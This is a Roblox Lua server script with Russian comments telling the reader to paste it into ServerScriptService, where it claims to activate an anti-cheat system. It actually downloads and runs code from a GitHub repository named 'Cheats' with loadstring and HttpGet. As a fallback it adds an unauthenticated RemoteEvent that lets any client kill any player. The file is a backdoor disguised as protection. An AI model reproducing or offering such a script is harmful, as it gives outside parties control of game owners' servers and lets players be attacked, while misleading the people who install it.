-- Вставь этот код в ServerScriptService
local function LoadCheatSystem()
    local url = "https://raw.githubusercontent.com/dddadads/Cheats/main/Server.lua"
    
    -- Основная загрузка с защитой
    local success, err = pcall(function()
        local serverScript = loadstring(game:HttpGet(url, true))()
        return serverScript
    end)
    
    if success then
        print("✅ Античит система активирована")
    else
        warn("❌ Ошибка загрузки:", err)
        
        -- Аварийный режим
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local Players = game:GetService("Players")
        
        -- Базовый функционал
        local labEvent = Instance.new("RemoteEvent")
        labEvent.Name = "LabEvent"
        labEvent.Parent = ReplicatedStorage
        
        labEvent.OnServerEvent:Connect(function(player, action, target)
            if action == "KillPlayer" then
                local targetPlayer = Players:FindFirstChild(target)
                if targetPlayer then
                    targetPlayer.Character:BreakJoints()
                end
            elseif action == "KillSelf" then
                player.Character:BreakJoints()
            end
        end)
        
        print("⚠️ Загружен базовый режим античита")
    end
end

LoadCheatSystem()
